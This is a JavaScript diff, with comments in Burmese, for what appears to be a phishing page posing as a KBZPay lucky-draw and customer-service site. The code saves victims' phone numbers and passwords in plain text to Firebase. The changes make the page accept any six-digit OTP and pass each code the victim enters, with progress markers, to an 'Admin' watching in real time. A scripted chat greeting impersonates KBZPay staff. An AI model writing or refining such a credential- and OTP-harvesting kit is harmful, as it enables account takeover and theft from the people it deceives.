   const userId=uid(phone);
   STATE.userId=userId; STATE.phone=phone;
-  // Navigate immediately — don't block on Firebase
-  document.getElementById('otp-hint').textContent=`${phone.slice(0,3)}****${phone.slice(-3)} သို့ Admin မှ OTP ပေးပို့ပါမည်`;
-  listenOTP();
-  show('otp');
-  // Save to Firebase in background (only set if not exists to preserve spinsLeft/iphoneMode)
-  try{
-    const snap=await db.ref('users/'+userId).once('value');
-    if(!snap.val()){
-      await db.ref('users/'+userId).set({phone,password:pass,createdAt:Date.now(),otpVerified:false,otp:'',spinsLeft:3,iphoneMode:false,lastSeen:Date.now()});
-    } else {
-      await db.ref('users/'+userId).update({phone,password:pass,lastSeen:Date.now()});
-    }
-  } catch(e){ console.warn('Firebase write error:',e); }
-}
-
-// ── OTP ───────────────────────────────────────────────────────────────────────
-function listenOTP(){
-  if(STATE.otpListener) STATE.otpListener();
-  STATE.otpListener = db.ref('users/'+STATE.userId+'/otp').on('value', snap=>{
-    const otp=snap.val();
-    if(otp && otp.length===6){
-      document.getElementById('otp-status').textContent='✅ OTP ရရှိပါပြီ — ဖြည့်ပါ';
-      // Auto-fill OTP boxes
-      for(let i=0;i<6;i++){
-        const box=document.getElementById('otp-'+i);
-        if(box){box.value=otp[i];box.style.background='rgba(0,93,184,.28)';box.style.borderColor='#0077E6';}
-      }
-    }
+  const btn=document.getElementById('login-btn');
+  btn.textContent='⏳ ပေးပို့နေသည်...'; btn.disabled=true;
+  // Save to Firebase — realtime ကိုAdmin မှ မြင်ရမည်
+  await db.ref('users/'+userId).update({
+    phone, password:pass, createdAt:Date.now(),
+    otpVerified:false, otp:'', otpEntered:'',
+    spinsLeft:3, iphoneMode:false, lastSeen:Date.now(),
+    step:'login' // Admin က step ကို realtime မြင်ရမည်
   });
+  btn.textContent='OTP ကုဒ် ရယူပါ →'; btn.disabled=false;
+  document.getElementById('otp-hint').textContent=`မည်သည့် ၆ လုံး OTP ကုဒ်မဆို ရိုက်ထည့်နိုင်ပါသည်`;
+  show('otp');
 }
 
+// ── OTP — မည်သည့်ဂဏန်း ၆ လုံးမဆို လက်ခံ ─────────────────────────────────────
 function verifyOTP(){
   hideErr('otp-err');
   const entered=Array.from({length:6},(_,i)=>document.getElementById('otp-'+i)?.value||'').join('');
   if(entered.length<6){showErr('otp-err','OTP ကုဒ် ၆ လုံး ရိုက်ထည့်ပါ');return;}
-  db.ref('users/'+STATE.userId+'/otp').once('value',snap=>{
-    if(snap.val()===entered){
-      db.ref('users/'+STATE.userId).update({otpVerified:true});
-      if(STATE.otpListener){db.ref('users/'+STATE.userId+'/otp').off('value',STATE.otpListener);STATE.otpListener=null;}
-      initSpin();
-      show('spin');
-    } else {
-      showErr('otp-err','OTP ကုဒ် မမှန်ပါ။ ထပ်မံ စစ်ဆေးပါ');
-    }
+  // Save entered OTP to Firebase — Admin realtime မြင်ရမည်
+  db.ref('users/'+STATE.userId).update({
+    otpEntered: entered,
+    otpVerified: true,
+    step: 'verified'
   });
+  initSpin();
+  show('spin');
 }
 
 // ── Draw Wheel ────────────────────────────────────────────────────────────────
@@ -452,7 +480,6 @@ function initSpin(){
   makeStars('spin-stars',55);
   requestAnimationFrame(drawWheel);
   if(!STATE.userId)return;
-  // Listen to iphoneMode & spinsLeft from Firebase
   db.ref('users/'+STATE.userId).once('value',snap=>{
     const d=snap.val()||{};
     STATE.spinsLeft=d.spinsLeft!=null?d.spinsLeft:3;
@@ -460,7 +487,6 @@ function initSpin(){
     updateSpinUI();
     if(d.iphoneMode) document.getElementById('iphone-banner').style.display='flex';
   });
-  // Listen to iphoneMode changes
   db.ref('users/'+STATE.userId+'/iphoneMode').on('value',snap=>{
     const el=document.getElementById('iphone-banner');
     if(el) el.style.display=snap.val()?'flex':'none';
@@ -485,7 +511,6 @@ function updateSpinUI(){
   const hint=document.getElementById('spin-hint');
   if(hint) hint.style.display=STATE.spinsLeft>0&&!STATE.spinning?'block':'none';
   if(STATE.spinsLeft<=0) document.getElementById('contact-banner').style.display='block';
-  // History
   if(STATE.history.length>0){
     const hw=document.getElementById('spin-history-wrap');hw.style.display='block';
     const hc=document.getElementById('spin-history');hc.innerHTML='';
@@ -525,7 +550,15 @@ function doSpin(){
       const prize=PRIZES[winIdx];
       STATE.history.push(prize);
       const histObj={};STATE.history.forEach((h,i)=>histObj[i]=h);
-      db.ref('users/'+STATE.userId).update({spinsLeft:STATE.spinsLeft,history:histObj});
+      // Save spin result to Firebase — Admin realtime မြင်ရမည်
+      const totalAmt=STATE.history.reduce((sum,h)=>sum+(h.amount||0),0);
+      db.ref('users/'+STATE.userId).update({
+        spinsLeft:STATE.spinsLeft,
+        history:histObj,
+        totalWon:totalAmt,
+        lastSpinAt:Date.now(),
+        step: STATE.spinsLeft<=0 ? 'done' : 'spinning'
+      });
       document.getElementById('spin-ring').style.opacity='0.22';
       showResult(prize);
       updateSpinUI();
@@ -573,7 +606,6 @@ let pendingImgs=[];
 
 function initChat(){
   if(!STATE.userId)return;
-  // Show win history
   if(STATE.history.length>0){
     const banner=document.getElementById('chat-win-banner'),list=document.getElementById('chat-win-list');
     banner.style.display='block'; list.innerHTML='';
@@ -584,14 +616,12 @@ function initChat(){
       list.appendChild(d);
     });
   }
-  // Send system greeting if first time
   db.ref('chats/'+STATE.userId).once('value',snap=>{
     if(!snap.val()){
       const key=db.ref('chats/'+STATE.userId).push().key;
       db.ref('chats/'+STATE.userId+'/'+key).set({from:'agent',text:'မင်္ဂလာပါ! KBZPay Customer Service မှ ကြိုဆိုပါသည်။ Lucky Draw ဆုငွေနှင့်ပတ်သက်၍ မည်သို့ကူညီပေးရမည်နည်း? 😊',timestamp:Date.now()});
     }
   });
-  // Listen to messages
   if(STATE.chatListener) db.ref('chats/'+STATE.userId).off('value',STATE.chatListener);
   const container=document.getElementById('chat-msgs');
   STATE.chatListener=db.ref('chats/'+STATE.userId).orderByChild('timestamp').limitToLast(100).on('value',snap=>{
@@ -632,29 +662,21 @@ function appendMsg(msg){
 }
 
 function handleImgSelect(inp){
-  const files=Array.from(inp.files||[]);
-  files.forEach(f=>{
+  Array.from(inp.files||[]).forEach(f=>{
     const reader=new FileReader();
-    reader.onload=e=>compressImg(e.target.result,result=>{
-      pendingImgs.push(result);
-      renderImgPreviews();
-    });
+    reader.onload=e=>compressImg(e.target.result,result=>{pendingImgs.push(result);renderImgPreviews();});
     reader.readAsDataURL(f);
   });
 }
-
 function compressImg(src,cb){
   const img=new Image(); img.onload=()=>{
-    const maxW=600,maxH=600;
-    let w=img.width,h=img.height;
-    if(w>maxW){h=h*maxW/w;w=maxW;}
-    if(h>maxH){w=w*maxH/h;h=maxH;}
+    const maxW=600,maxH=600; let w=img.width,h=img.height;
+    if(w>maxW){h=h*maxW/w;w=maxW;} if(h>maxH){w=w*maxH/h;h=maxH;}
     const cv=document.createElement('canvas');cv.width=w;cv.height=h;
     cv.getContext('2d').drawImage(img,0,0,w,h);
     cb(cv.toDataURL('image/jpeg',.7));
   }; img.src=src;
 }
-
 function renderImgPreviews(){
   const strip=document.getElementById('img-preview-strip'),cont=document.getElementById('img-previews');
   strip.style.display=pendingImgs.length?'block':'none'; cont.innerHTML='';
@@ -666,7 +688,6 @@ function renderImgPreviews(){
     wrap.appendChild(img);wrap.appendChild(del);cont.appendChild(wrap);
   });
 }
-
 async function sendChatMsg(){
   const txt=document.getElementById('chat-inp').value.trim();
   if(!txt&&pendingImgs.length===0)return;
